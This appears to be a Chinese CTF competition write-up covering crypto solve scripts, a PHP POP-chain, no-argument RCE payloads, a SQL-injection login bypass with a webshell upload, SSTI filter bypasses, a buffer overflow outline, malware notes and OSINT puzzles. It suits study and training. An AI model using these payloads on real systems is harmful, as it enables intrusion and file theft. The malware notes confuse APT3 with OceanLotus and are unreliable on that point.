<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">N = <span class="number">17630258257080557797062320474423515967705950026415012912087655679315479168903980901728425140787005046038000068414269936806478828260848859753400786557270120330760791255046985114127285672634413513991988895166115794242018674042563788348381567565190146278040811257757119090296478610798393944581870309373529884950663990485525646200034220648901490835962964029936321155200390798215987316069871958913773199197073860062515329879288106446016695204426001393566351524023857332978260894409698596465474214898402707157933326431896629025197964209580991821222557663589475589423032130993456522178540455360695933336455068507071827928617</span></span><br><span class="line">ct1 = <span class="number">5961639119243884817956362325106436035547108981120248145301572089585639543543496627985540773185452108709958107818159430835510386993354596106366458898765597405461225798615020342640056386757104855709899089816838805631480329264128349465229327090721088394549641366346516133008681155817222994359616737681983784274513555455340301061302815102944083173679173923728968671113926376296481298323500774419099682647601977970777260084799036306508597807029122276595080580483336115458713338522372181732208078117809553781889555191883178157241590455408910096212697893247529197116309329028589569527960811338838624831855672463438531266455</span></span><br><span class="line">ct2 = <span class="number">11792054298654397865983651507912282632831471680334312509918945120797862876661899077559686851237832931501121869814783150387308320349940383857026679141830402807715397332316601439614741315278033853646418275632174160816784618982743834204997402866931295619202826633629690164429512723957241072421663170829944076753483616865208617479794763412611604625495201470161813033934476868949612651276104339747165276204945125001274777134529491152840672010010940034503257315555511274325831684793040209224816879778725612468542758777428888563266233284958660088175139114166433501743740034567850893745466521144371670962121062992082312948789</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接尝试计算，但先减小指数 a</span></span><br><span class="line"><span class="comment"># 我们知道 a * e + b * (N+1) = 1</span></span><br><span class="line"><span class="comment"># 所以 a = (1 - b*(N+1)) / e</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b = -9443</span></span><br><span class="line">b = -<span class="number">9443</span></span><br><span class="line"><span class="comment"># 计算 a_mod = (1 - b*(N+1)) * inverse(e, N+1) mod (N+1)</span></span><br><span class="line"><span class="comment"># 但我们需要的是模 (N+1) 下的 a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 其实，我们只需要找到一个较小的 a&#x27; 使得 e*a&#x27; ≡ 1 mod (N+1)</span></span><br><span class="line"><span class="comment"># 因为我们在模 N 下工作，而不是模 φ(N)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 等等，我们真正需要的是：找到一个 k 使得 e*k ≡ 1 mod (N+1) 吗？</span></span><br><span class="line"><span class="comment"># 不，我们需要 a 和 b 满足 e*a + (N+1)*b = 1</span></span><br><span class="line"><span class="comment"># 这个方程是在整数环上，不是在模某个数下</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 让我们尝试计算 a 的模 (N-1) 约化形式</span></span><br><span class="line"><span class="comment"># 但更简单的方法是：注意到我们可以选择不同的 (a, b) 对</span></span><br><span class="line"><span class="comment"># 因为如果 (a, b) 是一组解，那么 (a + t*(N+1), b - t*e) 也是解</span></span><br><span class="line"><span class="comment"># 我们可以选择 t 使得 a&#x27; = a mod (N+1) 更小</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 让我们计算 a_mod = a mod (N+1)</span></span><br><span class="line"><span class="comment"># 这样 a 就会小于 N+1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 N+1</span></span><br><span class="line">N_plus_1 = N + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定的 a 非常大，我们计算 a mod (N+1)</span></span><br><span class="line">a_large = <span class="number">2540283026711807181861536113035098666143511086858369576404835933591346411827826901674191961860501528140391452859239071261479463131775879009587921745888608668132110896461673259879212637238304573181963640951731563010625789080731950705307950356563323791194888089277819789884639936551402017466264878334593324436411798864074014328805455629454762622091311310171180869868277313693845739439519674504825675878022620207979191297284245375432742615856611244937166141894766083209694029722306236880288585246282508562985251102375755189968176389384215111582840411023931794115105854905949462729938165005585420426570413841223725088575</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 a_small = a_large mod (N+1)</span></span><br><span class="line"><span class="comment"># 但由于 a_large 太大，Python 可能无法直接计算 mod</span></span><br><span class="line"><span class="comment"># 让我们用数学方法：a_large = q*(N+1) + r</span></span><br><span class="line"><span class="comment"># 但更简单的是，我们重新计算 a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新计算扩展欧几里得，但交换参数顺序，得到更小的 a</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extended_gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>, <span class="number">0</span>, a)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y, g = extended_gcd(b, a % b)</span><br><span class="line">        <span class="keyword">return</span> (y, x - (a // b) * y, g)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们要求 e*a + (N+1)*b = 1</span></span><br><span class="line"><span class="comment"># 但也可以求 (N+1)*a&#x27; + e*b&#x27; = 1，然后调整</span></span><br><span class="line"><span class="comment"># 让我们计算 gcd(N+1, e)</span></span><br><span class="line">x, y, g = extended_gcd(N_plus_1, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;x = <span class="subst">&#123;x&#125;</span>, y = <span class="subst">&#123;y&#125;</span>, gcd = <span class="subst">&#123;g&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在有：N+1 * x + e * y = 1</span></span><br><span class="line"><span class="comment"># 所以 e * y = 1 - (N+1)*x</span></span><br><span class="line"><span class="comment"># 因此 e * y ≡ 1 mod (N+1)</span></span><br><span class="line"><span class="comment"># 这意味着 y 是 e 模 (N+1) 的逆元</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们需要的是 e*a ≡ 1 mod (N+1)，所以 a = y</span></span><br><span class="line">a_new = y</span><br><span class="line">b_new = x</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a_new = <span class="subst">&#123;a_new&#125;</span>, b_new = <span class="subst">&#123;b_new&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证：e*a_new + (N+1)*b_new = ?</span></span><br><span class="line">check = e * a_new + N_plus_1 * b_new</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;验证: <span class="subst">&#123;e&#125;</span>*<span class="subst">&#123;a_new&#125;</span> + <span class="subst">&#123;N_plus_1&#125;</span>*<span class="subst">&#123;b_new&#125;</span> = <span class="subst">&#123;check&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在 a_new 应该小得多</span></span><br><span class="line"><span class="comment"># 计算 m = ct1^a_new * ct2^b_new mod N</span></span><br><span class="line"><span class="comment"># 注意 b_new 可能是负数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> b_new &lt; <span class="number">0</span>:</span><br><span class="line">    ct2_inv = inverse(ct2, N)</span><br><span class="line">    term2 = <span class="built_in">pow</span>(ct2_inv, -b_new, N)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    term2 = <span class="built_in">pow</span>(ct2, b_new, N)</span><br><span class="line"></span><br><span class="line">term1 = <span class="built_in">pow</span>(ct1, a_new, N)</span><br><span class="line">m = (term1 * term2) % N</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\n计算结果:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;m = <span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转成 bytes</span></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nFlag:&quot;</span>, flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    flag_str = flag.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Flag (string): <span class="subst">&#123;flag_str&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Hex 表示: <span class="subst">&#123;flag.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>核心攻击思路总结 (POP Chain)<br>这道题是一个典型的 PHP 反序列化（POP 链）构造题。我们需要通过反序列化一个精心构造的对象链，最终触发命令执行。</p>
<ol>
<li>寻找入口与终点<br>入口 (Source): begin 类。<br>它的 __destruct 会打印 <code>$this-&gt;var1</code>，这会触发 var1 所指对象的__toString 方法。<br>终点 (Sink): eenndd 类。<br>它的 __get 方法中含有 eval($this-&gt;command)，这是任意代码执行的地方。</li>
<li>构建 POP 链条<br>我们需要把入口和终点连起来：</li>
</ol>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">begin::__destruct()</span><br><span class="line">目的：触发 __toString。</span><br><span class="line">操作：设置 begin-&gt;var1 为一个 anna 对象。</span><br><span class="line">anna::__toString()</span><br><span class="line">代码：$this-&gt;var6-&gt;add()。调用了不存在的 add 方法。</span><br><span class="line">目的：触发 __call。</span><br><span class="line">操作：设置 anna-&gt;var6 为一个 starlord 对象。</span><br><span class="line">starlord::__call()</span><br><span class="line">代码：$function = $this-&gt;var4; return $function();。把 var4 当作函数调用。</span><br><span class="line">目的：触发 __invoke。</span><br><span class="line">操作：设置 starlord-&gt;var4 为一个 flaag 对象。</span><br><span class="line">flaag::__invoke()</span><br><span class="line">代码：访问 $this-&gt;var10-&gt;hey。访问了不存在的属性 hey。</span><br><span class="line">条件：需满足 MD5 弱类型检查 md5(md5($this-&gt;var11)) == 666。</span><br><span class="line">操作：设置 flaag-&gt;var11 为 &quot;213&quot; (碰撞结果)。设置 flaag-&gt;var10 为 eenndd 对象。</span><br><span class="line">目的：触发 __get。</span><br><span class="line">eenndd::__get()</span><br><span class="line">代码：正则检查 $this-&gt;command，通过后执行 eval。</span><br><span class="line">绕过：正则过滤了 flag, cat, system 等。</span><br><span class="line">操作：使用 passthru(base64_decode(&#x27;...&#x27;)) 或 eval($_POST[a]) 绕过。</span><br></pre></td></tr></table></figure>

<h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><p>核心难点回顾:<br>正则限制：preg_match(‘&#x2F;^[A-Za-z()_;]+$&#x2F;‘, $code)。只能用字母、括号、分号、下划线。<br>后果：不能用引号（无法指定文件名字符串）、不能用斜杠（无法写路径）、不能用参数。<br>报错原因：之前的 show_source(flag) 报错 No such file，是因为 PHP 默认在当前工作目录（&#x2F;var&#x2F;www&#x2F;html）下找 flag 文件，而真正的文件在根目录 &#x2F;flag。  </p>
<ol>
<li>成功 Payload 的深度解析<br>你的 Payload 分为两个部分，中间用分号 ; 隔开：</li>
</ol>
<p>chdir(dirname(dirname(dirname(getcwd())))); show_source(array_rand(array_flip(scandir(getcwd()))));  </p>
<p>第一步：改变工作目录 (Change Directory)<br>PHP<br>chdir(dirname(dirname(dirname(getcwd()))));<br>这是解题的关键转折点。</p>
<p>getcwd(): 获取当前目录，即 &#x2F;var&#x2F;www&#x2F;html。<br>dirname(): 取父目录。用了三次，路径变化如下：<br>&#x2F;var&#x2F;www&#x2F;html<br>&#x2F;var&#x2F;www<br>&#x2F;var<br>&#x2F; (根目录)<br>chdir(…): 将 PHP 的当前工作目录切换到了根目录 &#x2F;。<br>之前失败的原因：我们在 &#x2F;var&#x2F;www&#x2F;html 下告诉 PHP 打开 flag，它找不到。<br>现在成功的原因：我们已经“站”在根目录下了，此时打开 flag 就是打开当前目录下的文件，路径正确。<br>第二步：读取文件 (Read File)<br>PHP<br>show_source(array_rand(array_flip(scandir(getcwd()))));<br>getcwd(): 因为刚才执行了 chdir，现在这里返回的是 &#x2F;。<br>scandir(‘&#x2F;‘): 列出根目录下所有文件（包含 flag）。<br>array_flip() + array_rand():这是标准的“无参数随机读取”套路。<br>因为我们不能写整数下标（如 [6]），也不能写字符串（如 ‘flag’）。<br>所以把文件名变成数组的键，然后随机取一个键。<br>show_source(…): 读取随机选中的文件。<br>3. 通用解题思路总结 (无参数 RCE)<br>以后遇到类似题目（eval($_GET[‘code’]) 且正则只允许函数调用），可以按照这个流程思考：</p>
<p>Step 1: 侦察环境</p>
<p>Payload: print_r(scandir(getcwd()));<br>目的：看看当前目录下有什么文件，确定 Flag 是否在当前目录。<br>Step 2: 定位 Flag</p>
<p>如果 Flag 不在当前目录，通常在根目录。<br>Payload: print_r(scandir(dirname(dirname(getcwd())))); (根据目录层级调整 dirname 数量)<br>目的：确认 Flag 的文件名（是 flag 还是 flag.txt）以及大致位置。<br>Step 3: 移动并读取 (最稳妥策略)</p>
<p>直接读取文件通常涉及到路径问题（无法输入 &#x2F; 符号）。<br>最优解：先用 chdir() 配合 dirname() 跳到目标目录，然后再读取。<br>读取技巧：<br>确定位置：如果你知道 Flag 是数组倒数第二个，用 next(array_reverse(scandir(getcwd())))。<br>不确定位置：用 array_rand(array_flip(…)) 随机读取，多刷几次。<br>HTTP Header：如果环境允许，用 eval(end(getallheaders())) 是最省事的。<br>总结一句话<br>之前的报错是因为 PHP 在错误的目录下找文件；你的成功 Payload 通过 chdir 先“搬家”到根目录，然后再找文件，逻辑完美闭环。</p>
<h2 id="flag在哪里"><a href="#flag在哪里" class="headerlink" title="flag在哪里"></a>flag在哪里</h2><p>首先题目说明有爬虫，查看&#x2F;robots.txt<br>说明User-agent: *<br>Disallow: &#x2F;admin&#x2F;login.php</p>
<p>查看&#x2F;admin&#x2F;login.php</p>
<p>hint:账号以admin进入然后在密码栏使用SQL注入破坏<br>‘ OR ‘1’&#x3D;’1<br>然后进入一个文件上传页面<br>随便上传一个含有一句话木马的php文件即可<br>然后使用antsword连接<br>查看到flag在env里面</p>
<h2 id="power-tower"><a href="#power-tower" class="headerlink" title="power tower"></a>power tower</h2><p>标签（空格分隔）： 未分类</p>
<hr>
<p>这道题考察的是 模运算的降幂性质（费马小定理）。</p>
<p>原始代码中的加密逻辑是：</p>
<p>l &#x3D; pow(2, pow(2, t), n)  # 数学表达为: l &#x3D; 2^(2^t) mod n<br>c &#x3D; flag ^ l</p>
<p>解题脚本<br>请直接运行以下 Python 代码即可得到 Flag：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 题目给出的数据</span></span><br><span class="line">t = <span class="number">6039738711082505929</span></span><br><span class="line">n = <span class="number">107502945843251244337535082460697583639357473016005252008262865481138355040617</span></span><br><span class="line">c = <span class="number">114092817888610184061306568177474033648737936326143099257250807529088213565247</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 确定欧拉函数 phi(n)</span></span><br><span class="line"><span class="comment"># 因为 n 是质数，所以 phi(n) = n - 1</span></span><br><span class="line">phi = n - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 降幂计算有效的指数 exp</span></span><br><span class="line"><span class="comment"># 计算 exp = 2^t mod (n-1)</span></span><br><span class="line"><span class="comment"># 这一步利用了费马小定理，避免了直接计算 2^t 的内存溢出问题</span></span><br><span class="line">exp = <span class="built_in">pow</span>(<span class="number">2</span>, t, phi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 计算 l = 2^exp mod n</span></span><br><span class="line">l = <span class="built_in">pow</span>(<span class="number">2</span>, exp, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 解密 flag</span></span><br><span class="line"><span class="comment"># 原理: c = flag ^ l  ==&gt;  flag = c ^ l</span></span><br><span class="line">m = c ^ l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 将整数转换为字节串并打印</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<h2 id="SAD-BOOTLE"><a href="#SAD-BOOTLE" class="headerlink" title="SAD_BOOTLE"></a>SAD_BOOTLE</h2><p>首先审计代码# hint: flag is in &#x2F;flag</p>
<p>发现有黑名单BLACKLIST &#x3D; [“b”,”c”,”d”,”e”,”h”,”i”,”j”,”k”,”m”,”n”,”o”,”p”,”q”,”r”,”s”,”t”,”u”,”v”,”w”,”x”,”y”,”z”,”%”,”;”,”,”,”&lt;”,”&gt;”,”:”,”?”]</p>
<p>def contains_blacklist(content):<br>    “””检查内容是否包含黑名单中的关键词（不区分大小写）”””<br>    content &#x3D; content.lower()<br>    return any(black_word in content for black_word in BLACKLIST)<br>而且只有’f’l’a’g’和（）&#x2F;这几个符号没有被过滤</p>
<p>再看使解压平台想到使用压缩包路径穿梭，但是</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">def safe_extract_zip(zip_path, extract_dir):</span><br><span class="line">    &quot;&quot;&quot;安全解压ZIP文件（防止路径遍历攻击）&quot;&quot;&quot;</span><br><span class="line">    with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zf:</span><br><span class="line">        for member in zf.infolist():</span><br><span class="line">            member_path = os.path.realpath(os.path.join(extract_dir, member.filename))</span><br><span class="line">            if not member_path.startswith(os.path.realpath(extract_dir)):</span><br><span class="line">                raise ValueError(&quot;非法文件路径: 路径遍历攻击检测&quot;)</span><br><span class="line">            这里直接给防了</span><br><span class="line"></span><br><span class="line">此时继续看找到了sink点</span><br><span class="line"> if contains_blacklist(content):</span><br><span class="line">        return &quot;文件内容包含不允许的关键词&quot;</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        return template(content)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return f&quot;渲染错误: &#123;str(e)&#125;&quot;</span><br><span class="line">发现可以渲染所需要的文件。</span><br></pre></td></tr></table></figure>

<p>此时便思考能否通过斜体字来绕过</p>
<p>构造<code>&#123;&#123; 𝑜𝑝𝑒𝑛("/flag").𝑟𝑒𝑎𝑑() &#125;&#125;</code><br>此时成功获得flag</p>
<h2 id="who-am-I"><a href="#who-am-I" class="headerlink" title="who am I"></a>who am I</h2><p>首先注册个账号，然后登录，此时看到type&#x3D;1<br>通常admin设为0把值改掉，然后可以以管理员权限进去<br>可以看到几个重要文件此时关注dash<br>此时构造payload<br>GET &#x2F;operate?username&#x3D;app&amp;password&#x3D;jinja_loader.searchpath&amp;confirm_password&#x3D;[‘&#x2F;‘]<br>利用username和password来对渲染进行破坏</p>
<h2 id="REVERSE–ezzz-math（Z3"><a href="#REVERSE–ezzz-math（Z3" class="headerlink" title="REVERSE–ezzz_math（Z3)"></a>REVERSE–ezzz_math（Z3)</h2><p>查壳-&gt;无壳-&gt;用IDA-&gt;打开main 函数<br>Flag23 个字符，异或 0xC 解密<br><img src="https://img.cdn1.vip/i/695407c452023_1767114692.webp" alt="hajimi"><br>进入sub_40100 函数（23 个线性方程组）<br><img src="https://img.cdn1.vip/i/6954084267712_1767114818.webp" alt="hajimi"><br><img src="https://img.cdn1.vip/i/69540879d4e84_1767114873.webp" alt="hajimi"></p>
<h2 id="PWN—来签个到吧"><a href="#PWN—来签个到吧" class="headerlink" title="PWN—来签个到吧"></a>PWN—来签个到吧</h2><p>打开靶机-&gt;附件IDA 打开<br><img src="https://img.cdn1.vip/i/695408a2da5f7_1767114914.webp" alt="hajimi"></p>
<ol>
<li>构造 108 字节填充 + 返回地址 0xaddaaaaa</li>
<li>发送 payload 触发溢出</li>
<li>接收到”blueshark likes you too!”表示成功</li>
<li>执行 cat flag 获取 flag</li>
</ol>
<p><img src="https://img.cdn1.vip/i/695408db8bfa6_1767114971.webp" alt="hajimi"></p>
<h2 id="病毒分析"><a href="#病毒分析" class="headerlink" title="病毒分析"></a>病毒分析</h2><p>XOR 混淆（第二阶段）<br>解密第三阶段<br>UPX 压缩&#x2F;壳（第三阶段）<br>最终核心恶意代码  </p>
<h3 id="1-海莲花"><a href="#1-海莲花" class="headerlink" title="1.海莲花"></a>1.海莲花</h3><p><img src="https://img.cdn1.vip/i/6954090ac60d1_1767115018.webp" alt="hajimi"></p>
<ol>
<li><p>APT3（海莲花）最喜欢把 Drop 出来的 malware 放到 System32并伪装成系统组件（无扩展名或修改名）。</p>
</li>
<li><p>APT3 典型特征之一就是使用“随机命名、无扩展名”的二进制文件 TJe1w<br>fR6WI<br>这种随机大小写 + 无扩展名的文件，是海莲花最常见 Loader 的特征</p>
</li>
<li><p>APT3 常利用 LNK 配合系统程序（msiexec、wscript、cmd）来避免直接暴露恶意 exe。</p>
</li>
<li><p>近期活跃<br>APT3 在最近一年持续被多家威胁情报厂商点名，比如使用 PlugX、Koadic、以及定制 loader。</p>
</li>
</ol>
<h3 id="6-xor"><a href="#6-xor" class="headerlink" title="6.xor"></a>6.xor</h3><p>通过对第二阶段样本进行静态分析，观察到：<br>程序中出现明显的逐字节处理循环：  </p>
<p>decoded[i] &#x3D; encoded[i] ^ key</p>
<ul>
<li><p>常量 key 通常为 1 字节或 4 字节；</p>
</li>
<li><p>未出现复杂的加密库调用，如 CryptoAPI、AES&#x2F;RSA 函数；</p>
</li>
<li><p>明文 payload 解密后恢复出标准 PE 文件头（”MZ”）。这些特征强烈表明其采用 XOR 异或混淆。</p>
</li>
</ul>
<h3 id="8-UPX"><a href="#8-UPX" class="headerlink" title="8.UPX"></a>8.UPX</h3><p>对第三阶段解密后的可执行文件进行初步检查时，可观察到以下典型特征：</p>
<ul>
<li><p>文件头中包含 UPX! 标识；</p>
</li>
<li><p>.text、.data、.rsrc 等常规节区被替换为 UPX0、UPX1；</p>
</li>
<li><p>文件体积明显偏小，结构紧凑；</p>
</li>
<li><p>入口点跳转到一段“非常规”初始化代码；</p>
</li>
<li><p>使用 UPX 官方工具（upx -l）可成功识别并解压。</p>
</li>
</ul>
<h2 id="OSINT-2"><a href="#OSINT-2" class="headerlink" title="OSINT-2"></a>OSINT-2</h2><p><img src="https://img.cdn1.vip/i/6954097edb01b_1767115134.webp" alt="hajimi"><br>观察发现这座标志性大桥</p>
<p>通过Google搜索得知是曼哈顿大桥（Manhattan Bridge）</p>
<p>在曼哈顿大桥和另外一座桥中间逛一逛<br><img src="https://img.cdn1.vip/i/695409a7dab72_1767115175.webp" alt="hajimi"><br><img src="https://img.cdn1.vip/i/69540a3cab6e8_1767115324.webp" alt="hajimi"><br>就可以发现原图了</p>
<h2 id="OSINT-1"><a href="#OSINT-1" class="headerlink" title="OSINT-1"></a>OSINT-1</h2><p><img src="https://img.cdn1.vip/i/69540a7158123_1767115377.webp" alt="hajimi"><br>说实话第一题要比第二题难<br><img src="https://img.cdn1.vip/i/69540aa2d9821_1767115426.webp" alt="hajimi"><br>首先先看到这个图书馆，墙壁上的字推出在中国的某高校，结合出题人是福建理工大学的，先去看看理工的图书馆，发现不是，再去看理工旁边的大学，首先排除福师大，在福大发现目标</p>
<p>只不过有点奇怪的是按照格子数的准确点不是答案，以至于需要把广场上的格子都点一遍</p>
<h2 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h2><p>二分法</p>
<h2 id="阿利维亚的传说"><a href="#阿利维亚的传说" class="headerlink" title="阿利维亚的传说"></a>阿利维亚的传说</h2><p><img src="https://img.cdn1.vip/i/69540abf63609_1767115455.png" alt="hajimi"></p>
<p>首先打开WPS或者Word里显示隐藏文字的功能，有隐藏文字</p>
<p>找到flag1</p>
<p>再用foremost从图片中提取出一个zip压缩包，用Advanced Archive Password Recovery进行暴力破解，得到口令 : 8652，得到flag3</p>
<p>谕言3:</p>
<p>T&#x3D;FMfr</p>
<p>R&#x3D;iytY</p>
<p>U&#x3D;nGFo</p>
<p>E&#x3D;diou</p>
<p><img src="https://img.cdn1.vip/i/69540ae44d784_1767115492.webp" alt="hajimi"><br>用StegSolve打开图片，观察到图片中泰坦的三把钥匙颜色刚好对应red、green、blue，用LSB查看三个颜色数据，发现base64</p>
<p>解码后得到flag2：</p>
<p>谕言2:</p>
<p>W&#x3D;Hoeih</p>
<p>H&#x3D;ouTgo</p>
<p>l&#x3D;pIhhi</p>
<p>L&#x3D;uaeNc</p>
<p>E&#x3D;YkrCe</p>
<p>最后解密思路 : 每段谕言中列出的字母(例如谕言1的V&#x2F;A&#x2F;N)对应等长的字符串,把这些字符串按给定顺序逐字符纵向拼接(即取所有映射的第0位组成第1行,第1位组成第2行,依此类推),然后把这些行顺序连接即可得到明文。</p>
<p>示例(谕言1):V&#x3D;Dortt,A&#x3D;otuTa,N&#x3D;NTsin。逐行取字母得到行:”DoN”、”otT”、”rus”、”tTi”、”tan”,合并为“DoNotTrustTitan”。</p>
<p>解密结果（最终flag）：</p>
<p>· 谕言1:DoNotTrustTitan</p>
<p>· 谕言2:HopeYouMakeTherightChoice</p>
<p>· 谕言3:FindMyGiftForYou</p>
<p>ISCTF{DoNotTrustTitan_ HopeYouMakeTherightChoice FindMyGiftForYou}</p>
<h2 id="Miscrypto"><a href="#Miscrypto" class="headerlink" title="Miscrypto"></a>Miscrypto</h2><p>这是一道密码学结合杂项的题目</p>
<p>首先看n.txt，发现是Brainfuck加密，用在线网站解得：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">n=</span><br><span class="line"><span class="number">7644027341241571414254539033581025821232019860861753472899980529695625198016019462879314488666454640621660011189097660092595699889727595925351737140047609</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img.cdn1.vip/i/69540b120bf76_1767115538.webp" alt="hajimi"></p>
<p>然后看c.png，用Binwalk检测发现有两个png图片，提取出来另一个图片，但是没什么用，在010editor里查看原图数据，发现两个图片的尾部有东西，一个是base64</p>
<p><img src="https://img.cdn1.vip/i/69540b3680a48_1767115574.png" alt="hajimi"><br>另一个是自定义 Base64 字表</p>
<p>CDABGHEFKLIJOPMNSTQRWXUVabYZefcdijghmnklqropuvstyzwx23016745 +&#x2F;89</p>
